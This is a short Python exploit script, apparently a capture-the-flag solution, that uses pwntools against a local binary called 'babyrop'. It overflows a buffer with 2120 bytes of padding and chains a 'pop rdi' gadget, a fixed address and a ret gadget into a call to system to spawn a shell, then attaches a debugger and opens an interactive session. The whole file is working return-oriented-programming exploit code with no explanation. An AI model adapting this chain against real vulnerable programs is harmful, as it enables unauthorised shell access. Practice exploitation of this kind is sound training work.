from pwn import *

elf = context.binary = ELF("./babyrop")
io = process()
rop = ROP(elf)

payload = cyclic(2120)
payload += p64(rop.rdi.address)
payload += p64(0x404050)
payload += p64(rop.ret.address)
payload += p64(elf.sym.system)
gdb.attach(io)
io.sendline(payload)
io.interactive()
# io.interactive()
